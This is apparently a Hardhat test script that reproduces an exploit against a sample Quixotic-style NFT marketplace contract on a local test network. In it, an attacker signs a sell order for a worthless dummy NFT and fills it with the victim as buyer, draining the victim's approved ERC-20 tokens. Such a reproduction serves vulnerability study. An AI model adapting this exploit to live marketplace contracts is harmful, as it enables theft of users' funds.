const {
    time,
    loadFixture,
  } = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("demo", async function(){
    
    async function setupFixture() {
        [owner, attacker, victim] = await ethers.getSigners();
        // deploy erc20
        const ERC20 = await ethers.getContractFactory('SampleERC20', owner);
        const erc20 = await ERC20.deploy(ethers.utils.parseUnits("1000.0", "ether").mul(ethers.BigNumber.from('10000000000000')));
        await erc20.deployed();

        // deploy quixotic 
        const Quixotic = await ethers.getContractFactory('SampleQuixotic', owner);
        const quixotic = await Quixotic.deploy(erc20.address);
        await quixotic.deployed();

        // allocate money to victim
        const amount = ethers.utils.parseUnits("1.0", 18);
        await (await erc20.connect(owner).transfer(victim.address, amount)).wait();
        // buyer has lots of money approved to quixotic 
        await (await erc20.connect(victim).approve(quixotic.address, amount)).wait();
        return {owner, attacker, victim, quixotic, erc20};            
    }
    
    it("attacker", async function() {
        const {owner, attacker, victim, quixotic, erc20} = await loadFixture(setupFixture);
        console.log('[Before]token of attacker', 
        (await erc20.balanceOf(attacker.address)).toString());
        console.log('[Before]token of victim', 
        (await erc20.balanceOf(victim.address)).toString());
        
        // attacker create dummy NFT and approve Quixotic to operate his dummy NFT 
        const DummyNFT = await ethers.getContractFactory("DummyNFT", attacker);
        const dummyNFT = await DummyNFT.deploy();
        await dummyNFT.deployed();
        await (await dummyNFT.connect(attacker).setApprovalForAll(quixotic.address, true)).wait();
        // attacker creates and signs sell order
        domain = {
            name: 'Quixotic',
            version: '4',
            chainId: (await ethers.provider.getNetwork()).chainId,
            verifyingContract: quixotic.address
        };
        
        types = {
            SellOrder: [
                {name:'seller',type:'address'},
                {name:'contractAddress',type:'address'},
                {name:'tokenId',type:'uint256'},
                {name:'quantity',type:'uint256'},
                {name:'price',type:'uint256'},
                {name:'startTime',type:'uint256'},
                {name:'expiration',type:'uint256'},
                {name:'createdAtBlock',type:'uint256'},
            ]
        };

        const sellOrder = {
            seller: attacker.address,
            contractAddress: dummyNFT.address,
            tokenId: 1,
            quantity: 0, //doesnt matter
            price: ethers.utils.parseUnits("1.0", "ether"),
            startTime: 0,
            expiration: 99999999999,
            createdAtBlock: 1
        }

        var signature = await attacker._signTypedData(domain, types, sellOrder);
        console.log(signature);
        // attacker choose the buyer as victim and sell the worthless dummy NFT to buyer in the name of buyer
        const tx = await quixotic.connect(attacker).fillSellOrder(
            sellOrder.seller, sellOrder.contractAddress, sellOrder.tokenId,
            sellOrder.quantity, sellOrder.price, sellOrder.startTime, sellOrder.expiration, 
            sellOrder.createdAtBlock,
            signature, victim.address);
        const receipt = await tx.wait();
            
        console.log('[After]token of attacker', 
             (await erc20.balanceOf(attacker.address)).toString());
        console.log('[After]token of victim', 
             (await erc20.balanceOf(victim.address)).toString());
    });
});
